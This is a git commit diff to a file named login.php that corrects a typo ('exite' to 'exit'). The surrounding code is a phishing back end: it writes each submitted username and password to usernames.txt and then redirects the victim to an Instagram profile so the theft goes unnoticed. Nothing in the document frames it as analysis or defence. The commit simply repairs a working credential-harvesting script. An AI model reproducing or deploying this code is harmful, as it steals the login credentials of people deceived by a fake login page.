a13f26b1599fe0e96d52582d0f3ac8d3b9002acb
TheLinuxProject <64985848+thelinuxproject@users.noreply.github.com>
2020-05-23 21:20:22 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
  file_put_contents("usernames.txt","Account: " . $_POST['username'] . "Pass: " .$_POST['password'] . "\n",FILE_APPEND);
  header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
- exite();
+ exit();
 ?>
